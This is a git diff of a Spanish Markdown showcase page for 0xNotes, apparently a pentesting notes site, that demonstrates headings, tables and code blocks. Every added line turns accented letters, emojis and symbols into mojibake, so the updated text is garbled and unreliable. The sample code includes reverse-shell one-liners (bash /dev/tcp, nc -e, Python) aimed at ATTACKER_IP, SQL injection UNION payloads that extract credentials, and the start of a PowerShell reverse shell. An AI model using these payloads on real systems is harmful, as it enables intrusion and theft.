@@ -1,12 +1,12 @@
-# 🎨 Ejemplos Visuales del Diseño
+# 馃帹 Ejemplos Visuales del Dise帽o
 
-Este documento muestra ejemplos de todos los elementos de diseño implementados en 0xNotes.
+Este documento muestra ejemplos de todos los elementos de dise帽o implementados en 0xNotes.
 
 ## Encabezados
 
-# H1 - Título Principal en Verde Neón
+# H1 - T铆tulo Principal en Verde Ne贸n
 
-## H2 - Subtítulo con Borde Verde
+## H2 - Subt铆tulo con Borde Verde
 
 ### H3 - Tercer Nivel
 
@@ -16,21 +16,21 @@ Este documento muestra ejemplos de todos los elementos de diseño implementados 
 
 ## Texto y Formato
 
-Este es un párrafo normal con texto regular. Puedes incluir **texto en negrita** y *texto en cursiva*. También puedes combinarlos: ***negrita y cursiva***.
+Este es un p谩rrafo normal con texto regular. Puedes incluir **texto en negrita** y *texto en cursiva*. Tambi茅n puedes combinarlos: ***negrita y cursiva***.
 
-Aquí hay un enlace de ejemplo: [GitHub](https://github.com)
+Aqu铆 hay un enlace de ejemplo: [GitHub](https://github.com)
 
 ---
 
-## Código
+## C贸digo
 
-### Código Inline
+### C贸digo Inline
 
 Usa el comando `ls -la` para listar archivos, o ejecuta `nmap -sV 192.168.1.1` para escanear.
 
 Instala paquetes con `pip install requests` o `npm install express`.
 
-### Bloques de Código
+### Bloques de C贸digo
 
 #### Bash
 
@@ -98,7 +98,7 @@ fetch('http://api.example.com/data', {
 ' UNION SELECT NULL, NULL, NULL--
 ' UNION SELECT username, password, email FROM users--
 
--- Extraer información de la base de datos
+-- Extraer informaci贸n de la base de datos
 SELECT table_name 
 FROM information_schema.tables 
 WHERE table_schema = database();
@@ -112,14 +112,14 @@ WHERE admin = 1;
 #### PowerShell
 
 ```powershell
-# Información del sistema
+# Informaci贸n del sistema
 Get-ComputerInfo
 systeminfo
 
 # Usuarios administradores
 Get-LocalGroupMember -Group "Administrators"
 
-# Procesos en ejecución
+# Procesos en ejecuci贸n
 Get-Process | Where-Object {$_.CPU -gt 100}
 
 # Reverse shell
@@ -143,18 +143,18 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
 ### Lista Desordenada
 
 - Reconocimiento
-- Enumeración
+- Enumeraci贸n
   - Escaneo de puertos
-  - Identificación de servicios
-  - Búsqueda de vulnerabilidades
-- Explotación
+  - Identificaci贸n de servicios
+  - B煤squeda de vulnerabilidades
+- Explotaci贸n
   - SQL Injection
   - XSS
   - CSRF
-- Post-explotación
+- Post-explotaci贸n
   - Escalada de privilegios
   - Persistencia
-  - Exfiltración
+  - Exfiltraci贸n
 
 ### Lista Ordenada
 
@@ -175,7 +175,7 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
 - [x] Configurar Burp Suite
 - [x] Aprender Nmap
 - [ ] Completar OSCP
-- [ ] Obtener certificación CEH
+- [ ] Obtener certificaci贸n CEH
 - [ ] Practicar en HackTheBox
 
 ---
@@ -184,17 +184,17 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
 
 ### Tabla Simple
 
-| Herramienta | Categoría | Uso Principal |
+| Herramienta | Categor铆a | Uso Principal |
 |-------------|-----------|---------------|
 | Nmap | Reconocimiento | Escaneo de puertos |
-| Metasploit | Explotación | Framework de exploits |
+| Metasploit | Explotaci贸n | Framework de exploits |
 | Burp Suite | Web Testing | Proxy interceptor |
-| Wireshark | Network Analysis | Análisis de tráfico |
+| Wireshark | Network Analysis | An谩lisis de tr谩fico |
 | John the Ripper | Password Cracking | Crackeo de hashes |
 
 ### Tabla de Comandos
 
-| Comando | Descripción | Ejemplo |
+| Comando | Descripci贸n | Ejemplo |
 |---------|-------------|---------|
 | `nmap` | Escaneo de red | `nmap -sV target.com` |
 | `sqlmap` | SQL Injection | `sqlmap -u "url" --dbs` |
@@ -210,7 +210,7 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
 | 22 | SSH | TCP | Secure Shell |
 | 80 | HTTP | TCP | Web sin cifrar |
 | 443 | HTTPS | TCP | Web cifrado |
-| 445 | SMB | TCP | Compartición de archivos Windows |
+| 445 | SMB | TCP | Compartici贸n de archivos Windows |
 | 3306 | MySQL | TCP | Base de datos MySQL |
 | 3389 | RDP | TCP | Remote Desktop Protocol |
 
@@ -218,18 +218,18 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
 
 ## Blockquotes y Alertas
 
-> Este es un blockquote simple con información adicional.
-> Puede contener múltiples líneas.
+> Este es un blockquote simple con informaci贸n adicional.
+> Puede contener m煤ltiples l铆neas.
 
 > **NOTA**: Los blockquotes con **palabras en negrita** se resaltan en verde.
 
-> **IMPORTANTE**: Siempre obtén autorización por escrito antes de realizar pruebas de penetración.
+> **IMPORTANTE**: Siempre obt茅n autorizaci贸n por escrito antes de realizar pruebas de penetraci贸n.
 
 > **TIP**: Usa `--help` para ver todas las opciones de una herramienta.
 
-> **WARNING**: Este exploit puede causar denegación de servicio. Úsalo con precaución.
+> **WARNING**: Este exploit puede causar denegaci贸n de servicio. 脷salo con precauci贸n.
 
-> **DANGER**: Ejecutar este comando puede dañar el sistema. Solo para entornos de prueba.
+> **DANGER**: Ejecutar este comando puede da帽ar el sistema. Solo para entornos de prueba.
 
 ---
 
@@ -237,13 +237,13 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
 
 Enlaces normales: [OWASP](https://owasp.org/) | [HackTheBox](https://hackthebox.com/) | [TryHackMe](https://tryhackme.com/)
 
-Enlaces con código: Visita [`https://github.com`](https://github.com) para ver el código.
+Enlaces con c贸digo: Visita [`https://github.com`](https://github.com) para ver el c贸digo.
 
 ---
 
 ## Separadores
 
-Puedes usar líneas horizontales para separar secciones:
+Puedes usar l铆neas horizontales para separar secciones:
 
 ---
 
@@ -251,9 +251,9 @@ Puedes usar líneas horizontales para separar secciones:
 
 ---
 
-## Imágenes
+## Im谩genes
 
-Las imágenes se verían así (ejemplo):
+Las im谩genes se ver铆an as铆 (ejemplo):
 
 ![Logo Example](https://via.placeholder.com/600x200/2d3748/00ff88?text=0xNotes)
 
@@ -261,18 +261,18 @@ Las imágenes se verían así (ejemplo):
 
 ## Combinaciones
 
-### Código con explicación
+### C贸digo con explicaci贸n
 
 Para obtener una reverse shell en Linux:
 
 ```bash
-# Método 1: Bash
+# M茅todo 1: Bash
 bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
 
-# Método 2: Netcat
+# M茅todo 2: Netcat
 nc -e /bin/sh ATTACKER_IP PORT
 
-# Método 3: Python
+# M茅todo 3: Python
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
@@ -280,14 +280,14 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 ### Tabla con comandos inline
 
-| Acción | Comando |
+| Acci贸n | Comando |
 |--------|---------|
-| Escaneo básico | `nmap target.com` |
+| Escaneo b谩sico | `nmap target.com` |
 | Escaneo completo | `nmap -A -p- target.com` |
 | Detectar OS | `nmap -O target.com` |
 | Scripts NSE | `nmap --script vuln target.com` |
 
-### Lista con código
+### Lista con c贸digo
 
 Pasos para explotar SQL Injection:
 
@@ -299,23 +299,23 @@ Pasos para explotar SQL Injection:
 
 ---
 
-## Emojis y Símbolos
+## Emojis y S铆mbolos
 
 ### Emojis Comunes
 
-🔐 Seguridad | 🌐 Web | 🔧 Herramientas | 💻 Sistemas | 📝 Notas | 🚀 Rápido | ⚡ Eficiente | 🎯 Objetivo | ✅ Completado | ❌ Error | ⚠️ Advertencia | 💡 Idea | 📚 Recursos | 🏆 Logro | 🔍 Búsqueda | 🛡️ Protección
+馃攼 Seguridad | 馃寪 Web | 馃敡 Herramientas | 馃捇 Sistemas | 馃摑 Notas | 馃殌 R谩pido | 鈿?Eficiente | 馃幆 Objetivo | 鉁?Completado | 鉂?Error | 鈿狅笍 Advertencia | 馃挕 Idea | 馃摎 Recursos | 馃弳 Logro | 馃攳 B煤squeda | 馃洝锔?Protecci贸n
 
-### Símbolos Técnicos
+### S铆mbolos T茅cnicos
 
-→ ← ↑ ↓ ⇒ ⇐ ⇑ ⇓ • ○ ◆ ◇ ▪ ▫ ► ◄ ▲ ▼ ★ ☆ ✓ ✗ ∞ ≈ ≠ ≤ ≥ ± × ÷ √
+鈫?鈫?鈫?鈫?鈬?鈬?鈬?鈬?鈥?鈼?鈼?鈼?鈻?鈻?鈻?鈼?鈻?鈻?鈽?鈽?鉁?鉁?鈭?鈮?鈮?鈮?鈮?卤 脳 梅 鈭?
 
 ---
 
 ## Texto Especial
 
-### Código Multilenguaje
+### C贸digo Multilenguaje
 
-Ejemplo de implementación en varios lenguajes:
+Ejemplo de implementaci贸n en varios lenguajes:
 
 **Python:**
 ```python
@@ -341,17 +341,17 @@ echo "Hello, World!"
 
 ## Checklist Completa
 
-- [x] Diseño responsivo
+- [x] Dise帽o responsivo
 - [x] Modo claro/oscuro
 - [x] Syntax highlighting
-- [x] Búsqueda integrada
-- [x] Navegación por teclado
+- [x] B煤squeda integrada
+- [x] Navegaci贸n por teclado
 - [x] Copy-to-clipboard
-- [x] Paginación
+- [x] Paginaci贸n
 - [x] Sidebar colapsable
 - [x] Enlaces internos
 - [x] Tablas responsivas
-- [x] Código optimizado
+- [x] C贸digo optimizado
 - [x] Paleta de colores profesional
 - [x] Transiciones suaves
 - [x] Accesibilidad mejorada
@@ -363,16 +363,16 @@ echo "Hello, World!"
 
 Este documento muestra:
 
-1. ✅ **Encabezados** con diferentes niveles y estilos
-2. ✅ **Código inline** resaltado en verde
-3. ✅ **Bloques de código** con múltiples lenguajes
-4. ✅ **Tablas** con borders y hover effects
-5. ✅ **Listas** ordenadas, desordenadas y de tareas
-6. ✅ **Blockquotes** con destacados
-7. ✅ **Enlaces** con estilo verde
-8. ✅ **Emojis** y símbolos
-9. ✅ **Combinaciones** de elementos
+1. 鉁?**Encabezados** con diferentes niveles y estilos
+2. 鉁?**C贸digo inline** resaltado en verde
+3. 鉁?**Bloques de c贸digo** con m煤ltiples lenguajes
+4. 鉁?**Tablas** con borders y hover effects
+5. 鉁?**Listas** ordenadas, desordenadas y de tareas
+6. 鉁?**Blockquotes** con destacados
+7. 鉁?**Enlaces** con estilo verde
+8. 鉁?**Emojis** y s铆mbolos
+9. 鉁?**Combinaciones** de elementos
 
 ---
 
-**Prueba el toggle de tema (🌙/☀️) en la esquina inferior derecha para ver cómo cambian todos estos elementos!**
+**Prueba el toggle de tema (馃寵/鈽€锔? en la esquina inferior derecha para ver c贸mo cambian todos estos elementos!**
